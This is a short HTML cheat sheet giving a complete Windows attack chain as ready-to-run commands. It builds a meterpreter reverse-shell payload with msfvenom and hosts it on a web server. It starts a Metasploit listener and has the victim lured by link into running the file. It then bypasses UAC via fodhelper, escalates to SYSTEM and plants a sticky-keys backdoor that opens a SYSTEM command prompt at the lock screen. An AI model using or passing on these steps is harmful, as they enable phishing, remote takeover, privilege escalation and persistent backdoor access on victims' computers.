<html>
    <meta name=”robots” content=”noindex,nofollow”/>
  <a href=../index.html>Back to home</a>
<hr/>
<h1>Sticky Keys</h1>
<h2>Create malicious file</h2>
<p><ol>
<ul>msfvenom -p windows/meterpreter/reverse_tcp lhost=[MY IP ADDRESS] lport=444 -f exe > /home/myusername/Desktop/Windows.exe</ul>
</ol></p>
<h2>Host malicious file</h2>
<p><ol>
<ul>mkdir /var/www/html/share</ul>
<ul>chmod -R 755 /var/www/html/share</ul>
<ul>chown -R www-data:www-data /var/www/html/share</ul>
<ul>cp /home/myusername/Desktop/Windows.exe /var/www/html/share</ul>
</ol></p>
<h2>Start webserver</h2>
<p><ol><ul>service apache2 start</ul>
<ul>service nginx start</ul></ol></p>
<h2>Start Metasploit</h2>
<p><ol><ul>sudo msfconsole</ul>
<ul>use exploit/multi/handler</ul>
<ul>set payload windows/meterpreter/reverse_tcp</ul>
<ul>set LHOST [MY IP ADDRESS]</ul>
<ul>set LPORT 444</ul>
  <ul>run/ul>
</ol></p>
    <h2>Attack</h2>
<p>Send a link to the victim in order to open the malicious file</p>
<h2>Meterpreter shell</h2>
<p><ol><ul>sysinfo</ul>
<ul>getuid</ul>
<ul>background</ul></ol></p>
<h2>Bypass UAC</h2>
<p><ol>
<ul>search bypassuac </ul>
<ul>use exploit/windows/local/bypassuac_fodhelper</ul>
<ul>set session 1</ul>
<ul>show options</ul>
<ul>set LHOST [MY IP ADDRESS]</ul>
<ul>set TARGET 0</ul>
<ul>getsystem -t 1</ul>
<ul>getuid</ul>
<ul>background</ul>
<ul>use post/windows/manage/sticky_keys</ul>
<ul>sessions i*</ul>
<ul>set session 2</ul>
<ul>exploit</ul></ol></p>
<h2>Activate Sticky Keys</h2>
<p><ol>
<ul>On the logged-out Windows machine, press 5x SHIFT </ul>
<ul>this will open a command prompt on the lock screen with System privileges instead of sticky keys error window</ul>
<ul>whoami</ul>
